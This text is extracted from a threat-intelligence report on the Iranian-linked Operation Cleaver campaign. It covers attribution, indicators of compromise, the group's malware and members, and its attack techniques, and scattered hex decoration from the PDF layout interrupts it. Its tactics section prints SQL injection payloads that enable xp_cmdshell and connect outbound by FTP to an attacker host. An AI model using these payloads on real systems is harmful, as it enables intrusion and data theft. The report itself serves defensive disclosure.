                                                                                                         CO
                                                                        EN
                                                            M
                                                                                                                                                                   ER
                                                                                                                 TR
                                                                                                       LE
                                                                     EF
                                                                                                                                                                  EN
                                                                                                    TE
                                                                    D
                                   LEVEL OF CRITICAL IMPACT
                   Figure 3: Number of Cleaver victims by the level of access obtained as well as the level of critical impact potential.
 ATTRIBUTION
                   6f20476f6f64
                 44
               20
                c
              c2
    b204576696
 6e6
                  86
               546
                                  #OPCLEAVER
                                                                                                                            476f6f64
                                                                                                                        6f20
                                                                                                                      44
OPERATION
                                                                                                                    20
                                                                                                                    2c
                                                                                                         b204576696c
CLEAVER
                                                                                                       e6
                                                                                                     96
                                                                                                                       86
                                                                                                                    546
ATTRIBUTION
Despite today
s trend toward attacker attribution, we believe
it offers little real benefit to the day-to-day cyber defender.
However, in this report we offer our observations on the
sources of Operation Cleaver in order to benefit those that
rely on attribution such as Law Enforcement.
Operation Cleaver is believed to consist of at least 20
hackers and developers, collaborating on projects and
missions to support Iranian interests. Many of the targets were
predominately English-speaking and a majority of the team
members were capable of reading and writing in English. We
present evidence that this team is operating, at least in part,
out of Iran and in the interests of Iran. The skills and behavior
of the Operation Cleaver teams are consistent with, and in
one case surpasses, Iran
s cyber capabilities as we know
them today.
For a complete list of IPs and domains related to this
campaign, please refer to the Indicators of Compromise              Figure 4: The logo of the Army of the
                                                                    Guardians of the Islamic Revolution,
section.
                                                                    also known as the Islamic Revolutionary
                                                                    Guard Corps (IRGC).
ATTACKER IP ADDRESSES
Over the course of multiple incident response engagements related to Operation Cleaver, we
were able to identify a small set of IP addresses which were commonly used during the initial
stages of an attack.
The IP address 78.109.194.114 served as a source for one of the primary attackers.
They were observed conducting SQL injections, controlling backdoors, as well as exfiltrating
information using this address, and the address appears in multiple software configurations
recovered from staging servers over a period of time.
      GeoIP Location: Iran
      Net block: 78.109.194.96 - 78.109.194.127
      Owner: Tarh Andishan
      Email: tarh.andishan(at)yahoo.com
      Phone: +98-21-22496658
      NIC-Handle: TAR1973-RIPE
#OPCLEAVER
  This IP address was also observed in multiple software configurations. This particular net block
  was used over an extended period of time, indicating these were under the Cleaver team
  physical control. Additionally, prior netblocks used by the same team demonstrated to us that
  this wasn
t simply a case of proxying or 
island hopping
. For more information see the Tarh
  Andishan section of this report.
  The IP address 159.253.144.209 was a source for a secondary attacker in various
  compromises. They were observed conducting SQL injection attacks. While this IP was this
  registered in the Netherlands, we believe they used Softlayer
s Citrix demo environment to
  launch these attacks which is consistent with proxying or 
island hopping
     GeoIP Location: Netherlands
     Net block: 159.253.144.208 - 159.253.144.223
     ASN: Softlayer Technologies, Inc.
                 20476 f64
     IP Location: Netherlands, Amsterdam with Iranian sourcing.
              46f
            04
  ATTACKER 2DOMAINS
                               c
                             c2
  A number of Cleaver
s attack methods require a persistent server. In many cases, these servers
  were referenced by domain names. The following malicious domains are operated by this
                     04576696
  organization and are grouped by the registrant
s email address.
              davejsmith200(at)outlook.com      azlinux73(at)gmail.com
         
   Teledyne-Jobs.com                 
 MicrosoftServerUpdate.com
         
   DownloadsServers.com              
 WindowsSecurityUpdate.com
         
   NorthropGrumman.net               
 WindowsServerUpdate.com
                    2
         
   MicrosoftMiddleAst.com
                   b
                                             domain(at)netafraz.com
                  6
            salman.ghazikhani(at)outlook.com 
 EasyResumeCreatorPro.com
                 e
         
 Doosan-Job.com                   
 MicrosoftWindowsResources.com
               96
                                  6
              btr.8624(at)yahoo.com
                                 8              msnhst(at)microsoft.com
         
                   546
              GoogleProductUpdate.net           
 MicrosoftWindowsUpdate.net
         
   WindowsCentralUpdate.com
         
   WindowsUpdateServer.com
         
   DriverCenterUpdate.com
  As is typical with malicious domains, the Whois data for most of these domains contained falsified
  information.
  We managed to obtain a large collection of the internally developed tools used by the Cleaver
  team, many of which were developed by its members. Due to operational security failures, these
  tools contain information that provided us insight into their organization and operations.
                                                                                                     19
                                                                                                                                  476f6f64
                                                                                                                              6f20
                                                                                                                            44
OPERATION
                                                                                                                          20
                                                                                                                          2c
                                                                                                               b204576696c
CLEAVER
                                                                                                             e6
                                                                                                           96
                                                                                                                             86
                                                                                                                          546
TOOLS & SOFTWARE
Shell Creator 2
In the tool named Shell Creator 2, there are three main components. The creator generates
an ASPX web shell using user input as well as a collection of templates. The web shell could
then be installed via xp_cmdshell, or any other method which would grant the attacker write
access. The web shell is accessible by the shell client directly.
The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised
computer. We originally located it on a staging server being utilized for multiple attacks as well as
a tool for sharing data between members of the organization
s team.
The shell client, which is developed in Java and is easily decompiled, is a simple interface with
a feature to protect the operator from making a critical mistake. When executed, and before
any connection to an instance of the web shell is initiated, the shell client communicates with
freegeoip.net in order to get the external IP address of the current user. The country of origin
is then shown to the user, to inform them of what country it appears they are connecting from.
The assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin
of the attacker is not revealed.
After decompiling the shell client, we found the following code segment controlling the display of
this IP location information.
        Figure 5: Java source code showing how Shell Creator 2 distinguishes between a source IP address
        coming from Iran (red) versus any other country (green).
This code handles the XML response from freegeoip.net, and displays the information
as different colors based on different attributes. For instance, if the string 
ERROR
 is in the
response, the text is displayed with the color magenta. If the string IRAN is in the response, the
text is displayed with the color red. It should be noted that no other country name contains the
substring IRAN.
#OPCLEAVER
  Shell Creator 2 (cont.)
                 Figure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.
                                           6  f 20476 f64
                  Figure 7: Shell Creator4
                                     4    2 notifies the user in green when their source IP address is not Iran.
                                20
                                 c
                               c2
  Net Crawler
                       04576696
  Net Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached
  credentials from any and all accessible computers on an infected network. This is done with
  Windows Credential Editor (WCE) and Mimikatz in combination with PsExec. Different versions of
  this malware contain ASCII art which names the authoring group as Zhoupin (in 
leetspeak
Zh0up!n
                    6b2
                  6e
                 9
                                   86
                                546
         Figure 8: Net Crawler version 1.0 has ASCII art showing                Figure 9: Updated ASCII art found in Net
         the use of 
Zh0up!n
 in the campaigns tools.                           Crawler tool shows a version of 
Zh0up!n
                                                                                shortened to simply 
  For more information on Net Crawler, see the Tactics, Techniques and Procedures section.
                                                                                                                            21
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
TinyZBot
TinyZBot is a bot written in C# and developed by the Cleaver team. It is the longest developed
malware family discovered by this group, and has been used in campaigns for close to two
years. How it operates can vary greatly from version to version. For a detailed technical analysis
of TinyZBot, see the Tactics, Techniques and Procedures section. As TinyZBot is developed in
C#, many versions can be decompiled to code very similar to their originals, including names
of namespaces. Many versions were obfuscated with a legitimate tool for developers named
SmartAssembly, which makes the recovery of some names implausible.
We obtained multiple versions from which we were able to recover many of the original names of
variables and namespaces. In a number of these samples, the primary namespace for TinyZBot
is named Zhoupin_Cleaver. In every version of TinyZBot that is not obfuscated, there is a
code base referred to as Cleaver. This code base is also shared in other malware developed by
this organization, such as Csext.
PrivEsc
PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January
2010 called MS10-015, 
Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege
popularly known as the KiTrap0D exploit which was released publicly. The Cleaver team clearly
modified the source code and compiled a new version. The only detectable modification was to
change the original author
s name to instead display the following:
                                    Zhopin Exploit Team
This is not the only case of this team relabeling others
 work as their own.
Logger Module
Logger module is a component of the PVZ (PVZ is shorthand for Parviz, one of the members of
the Cleaver team) bot tool chain. When executed, it will capture the user
s keystrokes and save
them to a location which PVZ bot then exfiltrates. The logger module binary
s file description
value is the following:
                ye file khube DG. ba in ham kari nadashte bashin
Roughly translated from Persian, this text says:
                     DG is a good file, don
t bother with this
#OPCLEAVER
  Logger Module (cont.)
  This text could potentially be a note intended to stay internal, or could be an attempt to persuade
  an unsuspecting victim to assume the file is not malicious. The Product Name value is GOOD FILE.
  For more information on the PVZ bot tool chain, see the Tactics, Techniques, and Procedures
  section.
  CCProxy
  CCProxy is a publicly available proxy server for Windows, which can handle a variety of protocols.
  We do not believe that this organization was involved in the development or modification of
  CCProxy, but they have been observed using it. We recovered a CCProxy configuration, which
  exposed various operational details.
                                  6f 2 0476 f64
                                4 as well as a
  The configuration allowed for remote
                              4
                           20 was User-001,
  connections, limited by a username
  limited IP range. The username
                               c
  which is the default value. The limited IP range
                             c2
  covered one IP: 78.109.194.114.
                     04576696
  This IP address is located in Iran, and is owned by
  Tarh Andishan.
  The configuration also indicates which address
  the CCProxy server should listen on for incoming
  connections such as web (80) and mail (25).
                  6b2
                6e
               9
                                 86
                              546
                                                        Figure 10 (above): CCProxy configuration file
                                                        using the hardcoded IP address registered to Tarh
                                                        Andishan.
                                                        Figure 11 (left): CCProxy configuration file showing the
                                                        use of web and mail as listening ports.
                                                                                                                   23
                                                                                                                               476f6f64
                                                                                                                           6f20
                                                                                                                         44
OPERATION
                                                                                                                       20
                                                                                                                       2c
                                                                                                            b204576696c
CLEAVER
                                                                                                          e6
                                                                                                        96
                                                                                                                          86
                                                                                                                       546
 NMAP Log
 Log output from the network port scanning application NMAP was recovered from a staging
 server. This log was generated during the usage of the nbrute utility, which brute-forces network
 credentials and relies on NMAP to do so. The header of this NMAP log indicates that the computer
 used to run nbrute/nmap was set to Iran Daylight Time at the time of execution.
            Starting Nmap 6.25 at 2012-08-17 09:18 Iran Daylight Time
 With no known victims located in Iran, it is likely that this was executed on an attacker
s computer,
 and not on a victim
s computer.
 Squid Configuration
 A configuration file for a Squid proxy server was recovered.
                   Figure 12: Squid configuration file showing the use of Tarh Andishan
s IP address.
 The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC
 comment appended in order to make it look like it was part of the default configuration. It is likely
 this is the same reason a /28 net range was used, in order to not look like it was intended to only
 allow one IP. This would give the same access to resources accessible from the Squid proxy server
 to this Iranian IP address.
 TARH ANDISHAN
 Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email
 address tarh.andishan(at)yahoo.com. The net blocks appear to rotate over time and
 registrant information is altered to accommodate ongoing operations and avoid potential public
 exposure.
#OPCLEAVER
  TARH ANDISHAN (cont.)
  The networks are included below as well as the last time that net block was observed as active.
     
 78.109.194.96/27 - Current
     
 217.11.17.96/28 - 10/22/2014
     
 81.90.144.104/29 - 10/5/2014
     
 31.47.35.0/24 
 11/2012
  There are many seemingly legitimate Tarh Andishan related companies inside Tehran, but strong
  connections to Iranian backing have been difficult to prove definitively. 
Tarh Andishan
 is often
  translated as 
Thinkers
Innovators
 and 
Inventors
                               6 f 20476 f64
  The net blocks above have strong associations with state-owned oil and gas companies. These
                             4
  companies have current and former employees who are ICS experts.
                            4
  Tarh Andishan has been 2
                          0
                         suspected in the past of launching attacks in the interest of Iran. The
                                c
  operators of the blog IranRedLine.org, which comments on Iran
s nuclear weapons efforts, has
                              c2
  mentioned in multiple posts having been the target of debilitating brute-force authentication attacks
                      04576696
  from IP addresses registered to the same Tarh Andishan team found in Cleaver.
  In one of IranRedLine.org
s blog posts8, the author speculates on Tarh Andishan
s involvement
  with the Iranian government by showing close proximity to SPND, the Organization of Defensive
  Innovation and Research; however, the phone number listed under the registrant contact
  information has yet to be completely validated.
                   6b2
                 6e
                9
                                  86
                               546
           Figure 13: This image from IranRedLine.org demonstrates Tarh Andishan
s probably fabricated Whois
           address to the proximity to Iran
s SPND (Organization of Defensive Innovation and Research).
                                                                                                               25
                                                                                                                       476f6f64
                                                                                                                   6f20
                                                                                                                 44
OPERATION
                                                                                                               20
                                                                                                               2c
                                                                                                    b204576696c
CLEAVER
                                                                                                  e6
                                                                                                96
                                                                                                                  86
                                                                                                               546
MEMBERS
During this investigation, we were able to compile a considerable amount of information on some of
the members of this organization. The following profiles were built from reverse engineering, code
analysis, open source intelligence, incident response and forensics work. Personally identifiable
information about these members is not being shared publicly as it could endanger their lives and
would be irresponsible.
Parviz
Parviz is a developer who worked on a variety of projects, and was primarily active in 2013. His
development skillset is based around his ability to develop in C/C++. He has been observed using
Visual Studio 2010, and his tools are written exclusively for Windows. Some of his tools were found
to be packed with ASPack.
Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain. Parviz is likely
associated with the PVZ bot as his name in hardcoded into the PDB file paths.
The PVZ tool chain includes a variety of functionality, such as HTTP command and control
communications with an ASPX server-side component, a denial of service tool they developed, and
the public project named XYNTService used to run ordinary applications as services.
PDBs
 C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\
Release\BotManager.pdb
 C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket-test\
Release\socket-test.pdb
 C:\Users\parviz\Documents\Visual Studio 2010\Projects\
XYNTServiceProject\XYNTServiceProject\Debug\XYNTService.pdb
 C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\
Release\SendModule.pdb
#OPCLEAVER
  Nesha
  Nesha is one of the offensive members of this organization. Nesha was seen in breaches involving
  SQL injection as well as other techniques. Nesha often utilized web-based backdoors developed
  in ASPX, PHP as well as ColdFusion. A copy of an MS08-067 exploit developed in Python was
  recovered in which Nesha shamelessly replaced the original author
s name with his own.
  Nesha
s passwords very commonly include own handle. His passwords were frequently stored
  as hashes in backdoors, but common hash cracking methods were able to recover the plaintext
  versions. His observed password use is as follows:
   nesha nesha used as password in ColdFusion backdoors
   NeshaNesha12 used as password in ASPX backdoors.
                                    20476 f64
   nesha123 was found as a password in a recovered credential file with unknown association
                              4 6 f
                         0 4
  Cylance observed Nesha participating in compromises involving the following techniques:
 SQL injection
                       2
                               c
                             c2
   Web backdoors
   Cached credential dumping
                     04576696
  Nesha has additionally been identified using a variety of internally developed tools as well as the
  following publicly available tools:
   Cain & Abel
   PsExec
                    2
   PLink
                   b
   NetCat
                 e6
  Alireza
               96
                                 86
  Alireza appears to be one of the senior developers of this organization. His tools are commonly
                              546
  developed in C++, Java, and C# (desktop and ASPX). These tools are often support tools, either
  monitoring the activity of other tools or supplementing the function of other tools gathering
  information during the infiltration process. Alireza
s code appears to be reused internally on
  projects such as TinyZBot. Alireza appears to be using a version control system for his code, and
  it is likely that others are using the same system. Based on the paths, the version control system in
  use is likely Apache
s Subversion. Use of a version control system is indicative of code sharing, but
  the use of an older system like Subversion, along with other evidence, suggests there is not a large
  amount of collaboration on projects and likely one developer working on each project at a time.
  This is not behavior typical of a professional development team.
                                                                                                    27
                                                                                              476f6f64
                                                                                          6f20
                                                                                        44
OPERATION
                                                                                      20
                                                                                      2c
                                                                           b204576696c
CLEAVER
                                                                         e6
                                                                       96
                                                                                         86
                                                                                      546
Alireza (cont.)
Alireza
s C# tools include the following techniques:
    Querying Windows Management Instrumentation Command-line (WMIC)
    Cached credential dumping
    Generating ASPX shells
    Encryption
    Process enumeration
Alireza
s Java tools include the following techniques:
    HTTP communications
    GUI development
Alireza
s C++ tools include the following techniques:
    WinPcap interface
    ARP poisoning
    HTTP communications
    SMB communications
PDBs
 C:\Users\alireza\Documents\Visual Studio 2010\CPPProjects\IDCSercive\
trunk\Release\kagent.pdb
 C:\Users\alireza\Documents\Visual Studio 2010\CPPProjects\
PcapServiceInstaller\Release\PcapServiceInstaller.pdb
 C:\Users\alireza\Documents\Visual Studio 2010\Projects\
AntiVirusDetectorConsole\AntiVirusDetectorConsole\obj\x86\Release\
AntiVirusDetectorConsole.pdb
 C:\Users\alireza\Documents\Visual Studio 2010\Projects\
mimikatzWrapper\mimikatzWrapper\obj\x86\Debug\mimikatzWrapper.pdb
 C:\Users\alireza\Documents\Visual Studio 2010\Projects\ShellCreator2\
ShellCreator2\obj\x86\Debug\ShellCreator2.pdb
 c:\Users\alireza\Documents\Visual Studio 2012\Projects\BackDoorLogger\
BackDoorLogger\obj\Debug\BackDoorLogger.pdb
#OPCLEAVER
  kaJ
  kaJ is a .NET developer, and has only been observed working in C#. He has less English language
  proficiency than others in the organization, and likely has a supplemental role during compromises.
  He has been observed developing tools which cater to specific challenges in a compromise. His
  notable project was named Net Crawler, and a technical analysis of this tool can be found in the
  Tactics, Techniques and Procedures section. Thanks to a recovered test configuration for Net
  Crawler, we were able to determine that kaJ
s development computer has the name dev-castle,
  where he has the username kaJ and the password oaolrJ@vad. kaJ is believed to be the creator
  of the Zhoupin ASCII art displayed in Net Crawler.
  kaJ
s projects include the following techniques.
                                    20476 f64
   Interfacing with multiple cached credential dumping tools
   Interfacing with PsExec
                                 46f
   Worming behavior          4
                              20
  Jimbp
                               c
                             c2
                     04576696
  Jimbp is a .NET developer with minimal experience. His projects appear to be supplemental to
  TinyZBot and are very simplistic. It is believed he is the developer of the project Binder_1. This
  project was a simple malware binder which required manual configuration when compiling. His
  other work included creating a new service wrapper for TinyZBot.
  PDBs
                    2
 c:\Users\Jimbp\Desktop\Binder_1\Binder_1\obj\x86\Release\Setup.pdb
                   b
 c:\Users\Jimbp\Desktop\Binder_1 - for cleaver\Binder_1\obj\x86\
                 e6
  Release\Setup.pdb
                6
 c:\Users\Jimbp\Documents\Visual Studio 2013\Projects\
               9
  TestForInstallingService\TestForInstallingService\obj\Release\
                                 86
  TestForInstallingService.pdb
                              546
                                                                                                   29
                                                                                                                   476f6f64
                                                                                                               6f20
                                                                                                             44
OPERATION
                                                                                                           20
                                                                                                           2c
                                                                                                b204576696c
CLEAVER
                                                                                              e6
                                                                                            96
                                                                                                              86
                                                                                                           546
     TEAMS
     Of course many associated Iranian hacker teams have been identified in public and private
     security circles. Some of the teams publicly known today include Iranian Cyber Army, Ashiyane,
     Islamic Cyber Resistance Group, Izz ad-Din al-Qassam Cyber Fighters, Parastoo, Shabgard, Iran
     Black Hats and many others9.
     However, even though the TTPs of the Cleaver team have some overlap to techniques used by
     Iranian Cyber Army (botnets), Ashiyane (SQL injection) and Syrian Electronic Army (phishing and
     RATs), we believe this is largely the work of a new team. Some connections to Ashiyane were
     discovered in our investigations including a reference to hussein1363, who had prior ties to
     the hacker group. Additional connections between team members and individuals exist but are
     predominantly speculative and have only been shared with law enforcement.
     Ultimately we believe the Cleaver team is a mix of existing team members and new recruits
     pulled from the universities in Iran.
#OPCLEAVER
     TACTICS, TECHNIQUES
     & PROCEDURES
 TTP COVER HERE
                                          6f20476f6f64
                                       044
                                      2
                                  c
                                c2
                    c2b204576696
                                  6f20476 f64
                                44
                              20
                     6c
                  6e
            04576696
                           9
                                        686
                                      54
         6b2
        e
      96
                                 86
                              546
                                                         #OPCLEAVER
                                                                  31
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
TACTICS, TECHNIQUES & PROCEDURES
The Cleaver campaign used a variety of methods in multiple stages of attacks. In this section we
cover the commonly observed methods during different stages of the attack.
INITIAL COMPROMISE
The initial compromise gets the attackers their first foothold into the target network. Once the
ability to execute arbitrary code has been established, an attacker
s job becomes quite a bit
easier. Since the vector of initial compromise is usually determined by what is vulnerable on the
target, we
ll cover just a few of the techniques we
ve seen Operation Cleaver use to initiate the
compromise.
SQL Injection
SQL injection is a very common and simple attack method. It is made possible by a lack of input
sanitization by the vulnerable application before supplying that input into a SQL database query.
SQL injection payloads used by this organization have been double encoded. Double encoding
SQL injection payloads allows for bypassing of various anti-exploitation filters, such as those
supplied by Web Application Firewalls (WAFs).
The attackers would enable xp_cmdshell:
http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp_
cmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo.
sp_configure%20@b2,%201;RECONFIGURE;--%20
Then connect outbound via anonymous FTP:
http://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20
Spear-Phishing Campaign
Using messaging methods such as email, attackers can social engineer users into downloading
and executing software, which quietly installs malware alongside of the desired program.
Operation Cleaver has employed this technique numerous times across different organizations.
#OPCLEAVER
  EasyResumeCreatorPro.com
  The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct
  copy of a legitimate website at winresume.com. This is how the original site looked:
                                         6  f20476 f64
                                    4  4
                               20
           Figure 14: The original Easy R
 Creator Pro website on winresume.com is legitimate.
                                c
                              c2
                    b204576696
                  e6
                96
                                  86
           Figure 15: The fraudulent website, easyresumecreatorpro.com, is a fraudulent copy of the Easy
                               546
           Resume Creator Pro website to lure job candidates to download and install their TinyZBot agent.
  That
s not all they copied. In order to infect users, they combined the original Easy Resume Creator
  Pro product with malware by using a binder they developed internally named Binder_1. A binder
  is an application, which combines two executables (desired software and malware) into a single
  executable.
  The resulting executable masquerades as the desired software. The purpose is deception, to make
  the binder indistinguishable from the desired application. When executed, both applications are
  written to a temporary directory and executed. This way it appears that the desired application was
  executed, but the malware was also executed silently.
                                                                                                             33
                                                                                                                                  476f6f64
                                                                                                                              6f20
                                                                                                                            44
OPERATION
                                                                                                                          20
                                                                                                                          2c
                                                                                                               b204576696c
CLEAVER
                                                                                                             e6
                                                                                                           96
                                                                                                                             86
                                                                                                                          546
Teledyne R
 Submitter
                                                    This attack evolved to appear more legitimate. The
                                                    attackers made the victims feel like they had a pending
                                                    job opportunity at the industrial conglomerate Teledyne. In
                                                    order to take advantage of this job opportunity, the victim
                                                    needed to use the fake r
 submission application
                                                    supplied by the malicious recruiter. Multiple domains were
                                                    registered in order to make the download sites seem more
                                                    realistic. These domains included other companies as they
                                                    tried to hit a wider audience.
Figure 16: When the r
 submitting
application is executed, a splash screen is
displayed.                                                 
 Teledyne-Jobs.com
                                                           
 Doosan-Job.com
                                                           
 NorthropGrumman.net
                                                    At this point, the r
 submission application checks the
                                                    Internet connection. If it is unable to connect to the Internet,
                                                    it will display a window to input proxy information.
                                                    When this information is entered, the results are cached
                                                    in a location the dropped malware can access. After an
                                                    Internet connection is ensured, the malware (TinyZbot) is
                                                    dropped and executed. This clever scheme makes sure the
                                                    malware can connect to the command and control server,
Figure 17: Unable to connect to the Internet, the
                                                    and increases the chances that domain credentials are
tool prompts the user for proxy configuration
information.                                        cached on the now infected machine. Shortly after, the main
                                                    application is launched.
Figure 18: Final r
 submission form
displays to the user while the malware runs
freely in the background.
#OPCLEAVER
  Teledyne R
 Submitter (cont.)
  The first r
 submission form requests contact information. This form, like the rest of the
  submission forms, only stores the submitted information while the application is running. As the
  infected user is going through and filling out all this information, the malware is running in the
  background, logging their keystrokes, retrieving their stored passwords, etc. Once all the forms are
  filled out, the user goes to the submission form.
                                   6f20476 f64
                                 44
                               20
                                c
                              c2
                    b204576696
                   6
                       Figure 19: GET request to www.microsoft.com fakes the r
 submission.
                 6e
                9
                                  86
                               546
  When the victim hits submit, the r
 submitter does a GET request to microsoft.com in order
  to make it seem like it is submitting something, then claims success.
  This method is particularly effective not only because of its level of deception, but even if the victim
  suspects that they are infected with malware, they are not as likely to speak up about it, as they
  would need to explain why they were submitting a job application for another company.
                                                                                                       35
                                                                                                                  476f6f64
                                                                                                              6f20
                                                                                                            44
OPERATION
                                                                                                          20
                                                                                                          2c
                                                                                               b204576696c
CLEAVER
                                                                                             e6
                                                                                           96
                                                                                                             86
                                                                                                          546
PRIVILEGE ESCALATION & PIVOTING
Privilege escalation is a category of techniques that describe the process of going from a less
privileged user on a compromised computer to a more privileged user. This increase in privileges
allows for the attacker to gain access to privleged areas of the operating system as well as to
infect other computers on the target network.
This team did not utilize any novel methods of privilege escalation, but they were observed
using a variety of publicly known exploits. PrivEsc is a compiled exploit, which leverages
the vulnerability commonly referred to as KiTrap0D (CVE-2010-0232). The exploit allows for
escalation of privileges on unpatched Windows operating systems from an unprivileged user to
kernel-level privilege.
This vulnerability and the corresponding exploit were discovered and developed in 2010.
The plagiarized version used in Operation Cleaver was compiled in May 2013, with a slight
modification to the public source code. This modification changed the author
s details to Zhopin
Exploit Team.
Pivoting is the process of leveraging access from one compromised computer in order to gain
access to additional systems on the target network. This can involve launching attacks from the
compromised computer, or simply abusing access once it has been gained.
Cached Credential Dumping
A very common method of pivoting on a predominantly Windows operating system based
network is to extract domain credentials which have been used on the compromised computer
from a credential cache. There are a few well-known tools which are capable of doing this given
sufficient privileges on the infected host. Two of these tools used by Cleaver are Mimikatz and
Windows Credential Editor.
zhMimikatz and MimikatzWrapper
Two similar applications were developed by Operation Cleaver in order automate the execution
of Mimikatz. These applications are zhMimikatz and MimikatzWrapper. These applications store
multiple versions of Mimikatz in their resources. When executed, they determine which version
of Mimikatz to use based on whether the computer
s version of Windows is 32-bit or 64-bit. This
technique is uncommon in malware and shows the advanced skillset of the Cleaver team. Both
tools were developed in C#.
#OPCLEAVER
  zhMimikatz and MimikatzWrapper (cont.)
  In the following examples, the computer name is TheComputerName, the username of the
  logged in user is TheUser, and that user
s password is ThePassword. At the time of execution,
  the system only has its own credentials available and no cached network credentials.
  zhMimikatz
  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results
  for any cached credentials.
                                  6f20476 f64
                                44
                              20
                               c
                             c2
                   b204576696
                 e6
               96
                                 86
                              546
                                      Figure 20: zhMimikatz
                                                                                                  37
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
MimikatzWrapper
Output from MimikatzWrapper is essentially the same as zhMimikatz, despite being a different
Visual Studio project.
                                       Figure 21: The MimikatzWrapper.
The only external difference is that MimikatzWrapper also logs these results to res.txt in the
executing directory. This can make it useful for tools like the PVZ tool chain and Csext to execute
with logged results:
                          Figure 22: The MimikatzWrapper dumps credentials out to a file.
#OPCLEAVER
  PsExec Spreading
  Once an attacker has credentials extracted from the cache, whether in hash form or in plaintext
  form, PsExec can be used to run commands on any other computer which accepts those domain
  credentials. If this technique is combined with cached credential dumping, it can be used to jump
  from computer to computer on a compromised network.
  NetC (Net Crawler)
  Net Crawler utilizes a cached credential dumping technique along with PsExec in order to
  worm throughout a network, collecting any and all credentials that it can extract from credential
  caches. It has the ability to do this with both Windows Credential Editor and Mimikatz. It starts by
  first extracting cached credentials from the infected computer
s cache. Once this is complete, it
                                   f20476 f64
  then continues to scan a set of configured IP addresses on the local subnet to determine which
                                  6
                                 4
  IP addresses have SMB related ports open. Then an iterative methodology is applied to brute
                                4
                              20
  forcing each SMB enabled target with each credential that was extracted from the cache.
                               c
  When a positive result has been achieved, it will create a copy of itself with a modified
                             c2
  configuration stored as a PE resource, then send and execute the copy utilizing PsExec. This
                     04576696
  copy repeats the behavior of the original, but with already discovered credentials as well as
  newly discovered ones on the newly infected host. Any credentials found are reported back to
  the original infection.
                  6b2
                6e
               9
                                 86
                              546
                                                                                                         39
                                                                                                                                  476f6f64
                                                                                                                              6f20
                                                                                                                            44
OPERATION
                                                                                                                          20
                                                                                                                          2c
                                                                                                               b204576696c
CLEAVER
                                                                                                             e6
                                                                                                           96
                                                                                                                             86
                                                                                                                          546
 NetC (Net Crawler) cont.
 The following is a sample of some of the recovered results of Net Crawler executing on a live
 network:
                  Figure 23: The real output of a successfully run NetC effort at a victim organization.
 A more in depth analysis of Net Crawler, as part of the A Study in Bots series, will be available on
 Cylance
s blog.
#OPCLEAVER
  MS08-067 Exploit
  MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can
  be exploited by a specially crafted packet to the operating system
s RPC network interface. This
  vulnerability has been patched since October 2008, but many networks have failed to update their
  systems even to this day.
  Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability
  developed in Python. Someone in the Cleaver team (presumed to be Nesha) modified the exploit to
  read 
By Nesha
  Jasus
                                    f20476 f64
  Jasus is an ARP cache poisoner developed by the Operation Cleaver team. It makes use of
                                   6
                                  4
  WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning
                                 4
                               20
  utilities, Jasus is poorly developed and without many useful features. The primary positive attribute
  of Jasus is its poor detection ratio by the antivirus industry.
                                c
                              c2
  Cain & Abel
                      04576696
  Cain & Abel is a publicly available toolkit, which covers a wide range of functionality that assists
  attackers once they have compromised a node on a network. It has the ability to dump stored and
  cached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials
  being transmitted on the network. It also has a remotely installable trojan named Abel, which
  enables some of its functionality on a remote target.
                    b2
  We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches
                   6
  and the network when they are confident that there is little to no antivirus protection on the infected
                  e
  target.
                96
                                   6
  EXFILTRATION
                                  8
                               546
  Exfiltration is the process of moving information to an external site. In this context, it is the process
  of stealing information without being detected. Operation Cleaver has a strong focus on stealing
  confidential/privileged information, and they have utilized a few methods in order to facilitate this
  objective.
                                                                                                         41
                                                                                                                       476f6f64
                                                                                                                   6f20
                                                                                                                 44
OPERATION
                                                                                                               20
                                                                                                               2c
                                                                                                    b204576696c
CLEAVER
                                                                                                  e6
                                                                                                96
                                                                                                                  86
                                                                                                               546
Anonymous FTP Servers
Cleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access
enabled in order to pilfer large quantities of information. This allowed them to use existing
command line utilities available on their targets in order to upload information. This is a versatile
technique as it does not require any additional software which could be detected. These
FTP servers were also observed during the infection process, as infected computers were
often instructed to download additional files from these FTP servers, including backdoors and
pivoting tools.
The following IP addresses hosted FTP servers that were used in the infection of targets or in
the exfiltration of information.
    108.175.152.230      
 Santa Rosa, CA, USA
    108.175.153.158      
 Santa Rosa, CA, USA
    184.82.181.48 
      Pilot Mountain, North           Carolina, USA
    203.150.224.249      - Thailand
    64.120.208.74 -      Pilot Mountain, North           Carolina,     USA
